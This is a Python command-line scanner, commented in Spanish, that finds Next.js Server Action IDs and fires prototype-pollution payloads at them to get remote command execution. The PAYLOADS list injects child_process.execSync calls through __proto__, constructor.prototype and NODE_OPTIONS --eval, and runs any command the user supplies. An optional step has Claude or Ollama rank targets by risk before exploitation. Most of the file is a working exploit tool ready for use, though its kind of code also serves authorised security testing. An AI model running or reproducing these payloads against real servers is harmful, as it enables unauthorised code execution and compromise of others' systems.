#!/usr/bin/env python3
"""
Next.js Server Actions Scanner v2.0
====================================
Descubre Next-Action IDs automaticamente y testea Prototype Pollution / RCE.

Modos:
  static   — Extrae action IDs del bundle JS estatico
  proxy    — Captura IDs en tiempo real via proxy HTTP (requiere mitmproxy)
  manual   — Usa un action ID que tu especificas
  all      — static + explotacion automatica

Backend IA (opcional):
  --ai claude    : Usa Claude API (requiere ANTHROPIC_API_KEY)
  --ai ollama    : Usa modelo local via Ollama
  --ai none      : Solo heuristica (default)

Ejemplos:
  python scanner.py http://localhost:3000 --mode static
  python scanner.py http://localhost:3000 --mode static --ai claude
  python scanner.py http://localhost:3000 --mode proxy --proxy-port 8080
  python scanner.py http://localhost:3000 --mode manual --action-id abc123 --cmd "id"
  python scanner.py http://localhost:3000 --mode all --ai ollama --output report.json
"""

import argparse
import time
import sys
import json
import base64
import requests as req
from urllib.parse import urljoin

from modules.js_extractor import JSExtractor, ActionID
from modules.ai_analyzer import analyze as ai_analyze
from modules import reporter


# ---------------------------------------------------------------------------
# Payloads de explotacion
# ---------------------------------------------------------------------------

PAYLOADS = [
    {
        "desc": "__proto__.outputFunctionName (RCE clasico)",
        "body_template": lambda cmd: {
            "__proto__": {
                "outputFunctionName": f"_x;global.process.mainModule.require('child_process').execSync('{cmd}').toString();//"
            }
        },
    },
    {
        "desc": "constructor.prototype pollution",
        "body_template": lambda cmd: {
            "constructor": {
                "prototype": {
                    "outputFunctionName": f"_x;global.process.mainModule.require('child_process').execSync('{cmd}').toString();//"
                }
            }
        },
    },
    {
        "desc": "__proto__ shell env (NODE_OPTIONS)",
        "body_template": lambda cmd: {
            "__proto__": {
                "env": {"NODE_OPTIONS": f"--eval=require('child_process').execSync('{cmd}')"},
                "shell": True,
            }
        },
    },
    {
        "desc": "Detection only (__proto__.polluted)",
        "body_template": lambda cmd: {
            "__proto__": {"polluted": "NEXTJS_VULN_CONFIRMED"}
        },
    },
]

VULN_INDICATORS = [
    "uid=0", "root", "NEXTJS_VULN_CONFIRMED", "polluted",
    "/bin/sh", "cmd.exe", "whoami", "nt authority",
]


def decode_b64_header(value: str) -> str:
    try:
        return base64.b64decode(value + "==").decode("utf-8", errors="replace")
    except Exception:
        return value


def test_action_id(
    base_url: str,
    path: str,
    action_id: str,
    cmd: str,
    timeout: int,
    verify_ssl: bool,
) -> list[dict]:
    """Prueba todos los payloads contra un action ID. Retorna lista de resultados."""
    results = []
    session = req.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Security-Scanner/1.0)"})

    for payload_def in PAYLOADS:
        body = payload_def["body_template"](cmd)
        url = urljoin(base_url, path)

        try:
            resp = session.post(
                url,
                headers={
                    "Content-Type": "application/json",
                    "Next-Action": action_id,
                },
                json=body,
                timeout=timeout,
                verify=verify_ssl,
                allow_redirects=False,
            )
        except Exception as e:
            results.append({
                "action_id": action_id,
                "payload_desc": payload_def["desc"],
                "vulnerable": False,
                "error": str(e),
            })
            continue

        # Analiza respuesta
        redirect_raw = resp.headers.get("x-action-redirect", "")
        redirect_decoded = decode_b64_header(redirect_raw) if redirect_raw else ""
        body_text = resp.text[:500] if resp.text else ""
        combined = redirect_decoded + body_text

        is_vuln = any(ind.lower() in combined.lower() for ind in VULN_INDICATORS)

        results.append({
            "action_id": action_id,
            "payload_desc": payload_def["desc"],
            "vulnerable": is_vuln,
            "status": resp.status_code,
            "output": redirect_decoded or body_text[:200],
            "raw_redirect_header": redirect_raw,
        })

        if is_vuln:
            break  # Encontrado, no hace falta seguir

    return results


# ---------------------------------------------------------------------------
# Modos
# ---------------------------------------------------------------------------

def mode_static(args) -> list[ActionID]:
    reporter.section("FASE 1 — Extraccion estatica de Action IDs")
    extractor = JSExtractor(
        base_url=args.url,
        timeout=args.timeout,
        verify_ssl=not args.no_verify,
        verbose=args.verbose,
    )
    result = extractor.run()

    if result.errors:
        for err in result.errors:
            print(f"  {reporter.YELLOW}[!] {err}{reporter.RESET}")

    print(f"  [+] Scripts escaneados : {len(result.js_urls_scanned)}")
    print(f"  [+] Action IDs         : {len(result.action_ids)}")
    return result.action_ids


def mode_proxy(args) -> list[ActionID]:
    reporter.section("FASE 1 — Captura en tiempo real via Proxy")
    try:
        from modules.proxy_interceptor import run_proxy
    except ImportError as e:
        print(f"  {reporter.RED}[!] {e}{reporter.RESET}")
        sys.exit(1)

    print(f"  [*] Iniciando proxy en 127.0.0.1:{args.proxy_port}")
    print(f"  [*] Configura tu browser para usar ese proxy")
    print(f"  [*] Navega el SaaS y presiona Ctrl+C cuando termines\n")

    store = run_proxy(port=args.proxy_port, target_url=args.url, verbose=args.verbose)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    captured = store.all()
    print(f"\n  [+] {len(captured)} action IDs capturados")

    # Convierte a ActionID
    return [
        ActionID(
            value=c.action_id,
            source_url=c.url,
            pattern_matched="proxy_capture",
        )
        for c in captured
    ]


def mode_manual(args) -> list[ActionID]:
    reporter.section("FASE 1 — Action ID manual")
    aid = ActionID(
        value=args.action_id,
        source_url=args.url,
        pattern_matched="manual",
    )
    print(f"  [+] Usando: {args.action_id}")
    return [aid]


def run_ai_phase(action_ids: list[ActionID], args) -> list:
    """Fase opcional de analisis con IA."""
    if args.ai == "none" or not action_ids:
        return []

    reporter.section(f"FASE 2 — Analisis IA ({args.ai})")

    ids_values = [a.value for a in action_ids]
    contexts = [a.context for a in action_ids if a.context]

    result = ai_analyze(
        action_ids=ids_values,
        js_contexts=contexts,
        backend=args.ai,
        model=args.ai_model,
        api_key=args.ai_key,
        ollama_host=args.ollama_host,
    )

    if result.error:
        print(f"  {reporter.YELLOW}[!] Error en IA: {result.error}{reporter.RESET}")
        return []

    print(f"  [+] Analisis completado para {len(result.analyses)} IDs")
    return result.analyses


def run_exploit_phase(action_ids: list[ActionID], analyses, args) -> list[dict]:
    """Fase de explotacion."""
    reporter.section("FASE 3 — Testing de Prototype Pollution")

    if not action_ids:
        print(f"  {reporter.YELLOW}Sin action IDs para testear{reporter.RESET}")
        return []

    # Ordena por riesgo si hay analisis de IA
    analysis_map = {a.action_id: a for a in analyses}
    risk_order = {"high": 0, "medium": 1, "low": 2, "unknown": 3}
    sorted_ids = sorted(
        action_ids,
        key=lambda x: risk_order.get(
            getattr(analysis_map.get(x.value), "risk", "unknown"), 3
        )
    )

    all_results = []
    for aid in sorted_ids:
        print(f"\n  [*] Testeando: {aid.value[:20]}...")
        results = test_action_id(
            base_url=args.url,
            path=args.path,
            action_id=aid.value,
            cmd=args.cmd,
            timeout=args.timeout,
            verify_ssl=not args.no_verify,
        )
        all_results.extend(results)

        vuln = any(r["vulnerable"] for r in results)
        status = f"{reporter.RED}VULNERABLE{reporter.RESET}" if vuln else f"{reporter.GREEN}OK{reporter.RESET}"
        print(f"         -> {status}")

    return all_results


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    p.add_argument("url", help="URL base del target (ej: http://localhost:3000)")
    p.add_argument("--mode", choices=["static", "proxy", "manual", "all"],
                   default="static",
                   help="Modo de descubrimiento de action IDs (default: static)")
    p.add_argument("--path", default="/", help="Path del endpoint (default: /)")
    p.add_argument("--action-id", default="", help="Action ID manual (para modo manual)")
    p.add_argument("--cmd", default="id", help="Comando para payloads RCE (default: id)")

    # IA
    p.add_argument("--ai", choices=["none", "claude", "ollama"], default="none",
                   help="Backend de IA para analizar action IDs (default: none)")
    p.add_argument("--ai-model", default="",
                   help="Modelo especifico (ej: claude-haiku-4-5-20251001, llama3)")
    p.add_argument("--ai-key", default="", help="API key (o usa ANTHROPIC_API_KEY)")
    p.add_argument("--ollama-host", default="http://localhost:11434")

    # Proxy
    p.add_argument("--proxy-port", type=int, default=8080)

    # Opciones generales
    p.add_argument("--timeout", type=int, default=10)
    p.add_argument("--no-verify", action="store_true", help="Desactivar SSL verify")
    p.add_argument("--no-exploit", action="store_true", help="Solo discovery, sin explotar")
    p.add_argument("--output", default="", help="Guardar reporte JSON en este archivo")
    p.add_argument("--verbose", "-v", action="store_true")

    return p


def main():
    args = build_parser().parse_args()
    start = time.time()

    reporter.banner()
    print(f"  Target : {args.url}")
    print(f"  Modo   : {args.mode}")
    print(f"  IA     : {args.ai}")
    print(f"  Cmd    : {args.cmd}")

    # Fase 1: Discovery
    if args.mode == "static" or args.mode == "all":
        action_ids = mode_static(args)
    elif args.mode == "proxy":
        action_ids = mode_proxy(args)
    elif args.mode == "manual":
        if not args.action_id:
            print(f"{reporter.RED}[!] --action-id requerido en modo manual{reporter.RESET}")
            sys.exit(1)
        action_ids = mode_manual(args)
    else:
        action_ids = mode_static(args)

    # Fase 2: IA (opcional)
    analyses = run_ai_phase(action_ids, args)

    # Muestra IDs encontrados
    reporter.print_action_ids(action_ids, analyses)

    # Fase 3: Explotacion
    exploit_results = []
    if not args.no_exploit and action_ids:
        exploit_results = run_exploit_phase(action_ids, analyses, args)
        reporter.print_exploit_results(exploit_results)
    elif args.no_exploit:
        print(f"\n  {reporter.DIM}[*] Explotacion omitida (--no-exploit){reporter.RESET}")

    # Resumen
    elapsed = time.time() - start
    n_vuln = sum(1 for r in exploit_results if r.get("vulnerable"))
    reporter.print_summary(
        target=args.url,
        n_ids=len(action_ids),
        n_vuln=n_vuln,
        backend=args.ai,
        elapsed=elapsed,
    )

    # Exporta JSON
    if args.output:
        data = {
            "target": args.url,
            "mode": args.mode,
            "action_ids": [
                {"value": a.value, "source": a.source_url, "context": a.context}
                for a in action_ids
            ],
            "exploit_results": exploit_results,
            "elapsed_s": elapsed,
        }
        reporter.save_json(args.output, data)


if __name__ == "__main__":
    main()
